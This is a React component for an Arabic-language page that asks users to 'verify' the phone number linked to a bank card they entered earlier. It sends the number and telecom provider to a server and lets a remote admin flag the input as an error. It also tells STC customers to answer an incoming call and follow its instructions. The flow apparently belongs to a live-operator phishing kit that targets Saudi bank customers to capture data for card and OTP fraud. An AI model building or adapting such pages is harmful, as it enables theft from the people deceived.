import Main from "@/components/MainWrapper.tsx";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useSignals } from "@preact/signals-react/runtime";
import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import PhoneInput from "react-phone-number-input";
import "react-phone-number-input/style.css";
import { useNavigate } from "react-router-dom";
import { isAdminError, logo, mainInfo } from "@/real-time/context/signals.ts";
import { ArrowUpRight } from "lucide-react";
import { validatePhoneSAnumber } from "@/lib/helpers.ts";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils.ts";
import telProviders from "@/data/tel-providers";

function Mobileverification() {
  useEffect(() => {
    setCurrentPage("mobile-verification");
  }, []);

  const { handleSubmit } = useForm({ mode: "all" });
  useSignals();
  const [phone, setValue] = useState<any>(mainInfo.value.phone);
  const [provider, setProvider] = useState("اختر");
  const navigate = useNavigate();
  const [error, setError] = useState({ phone: false, provider: false });

  function sendData() {
    sendDataToServer({
      data: {
        "رقم الجوال": phone,
        "مزود الخدمة": provider,
      },
      current: "mobile-verification",
      nextPage: "verify",
      waitingForAdminResponse: false,
      navigate,
    });
  }

  const handlePhoneChange = (value: string | undefined) => {
    setValue(value);
    const isValid = validatePhoneSAnumber(value);

    if (!isValid) setError({ ...error, phone: true });
    else setError({ ...error, phone: false });
  };

  const handleProviderChange = (value: string) => {
    logo.value = value;
    setProvider(value);
    if (value === "اختر") setError({ ...error, provider: true });
    else setError({ ...error, provider: false });
  };

  useEffect(() => {
    if (isAdminError?.value) setError({ phone: true, provider: true });
  }, [isAdminError?.value]);

  return (
    <Main>
      <div className="bg-gray-100 min-h-screen py-20">
        <form
          className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
          onSubmit={handleSubmit(sendData)}
        >
          <div className="bg-gradient-to-tl from-main/20 to-main/5 py-2 px-6 mb-4 rounded-xl">
            <img
              src="/assets/images/logo.webp"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <img
            src="/assets/images/client/mutasil.png"
            alt="mobile header image"
            className="mb-6 w-1/4"
          />

          <div className="flex gap-2">
            <img
              src="/assets/images/client/mobile.png"
              className="h-12"
              alt="mobile logo"
            />

            <div className="flex gap-1">
              <ArrowUpRight className="cursor-pointer w-12 text-main" />

              <h2 className="mb-8 font-bold text-gray-600">
                توثيق واعتماد رقم الجوال المرتبط بالحساب البنكي لبطاقة الصراف
                المدخلة مسبقاً
              </h2>
            </div>
          </div>

          <div className="flex flex-col gap-2" dir="rtl">
            <div className="h-12 flex gap-5 mb-4">
              {logo.value === "اس تي سي" && (
                <p className="text-[#4f008c] text-md font-light">
                  عزيزي العميل, سوف تتلقى مكالمة لتوثيق رقم جوالك يرجى الرد على
                  المكالمة واتباع التعليمات
                </p>
              )}

              {telProviders.filter((tel) => tel.name === logo.value)[0] && (
                <img
                  src={
                    telProviders.filter((tel) => tel.name === logo.value)[0]
                      .logo
                  }
                  className="h-full ms-auto"
                  alt={`${logo.value} logo`}
                />
              )}
            </div>
            <div>
              <span className="text-xs font-medium">رقم الجوال</span>
              <PhoneInput
                value={phone}
                id="phone"
                onChange={handlePhoneChange}
                defaultCountry="SA"
                addInternationalOptional={false}
                placeholder="اكتب رقم الجوال هنا"
                className={`px-2 [&_.PhoneInputCountrySelectArrow]:ml-2 w-full outline-none border rounded-lg relative transition-all rtl ${
                  error.phone
                    ? "border-red-500 bg-red-50 [&>input]:bg-red-50"
                    : "border-gray-300 bg-gray-100"
                } `}
              />
            </div>

            <Select onValueChange={handleProviderChange} value={provider}>
              <SelectTrigger
                className={`w-full ${
                  error.provider ? "border-red-500" : "border-gray-300"
                }`}
                style={{ direction: "rtl" }}
              >
                <SelectValue defaultValue={"اختر"} />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value={"اختر"} style={{ direction: "rtl" }}>
                  اختار مزود الخدمة
                </SelectItem>

                {telProviders.map(({ name }) => (
                  <SelectItem
                    key={name}
                    value={name}
                    style={{ direction: "rtl" }}
                  >
                    {name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <button
            disabled={error.phone || provider === "اختر"}
            className="w-fit ms-auto mt-2 lg:text-xl capitalize rounded-3xl font-bold py-1.5 px-10 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
          >
            دخول
          </button>

          <img
            src="/assets/images/client/below-mob-verify.png"
            alt="mobile header image"
            className="mt-6 mx-auto"
          />
        </form>
      </div>
    </Main>
  );
}

export default Mobileverification;
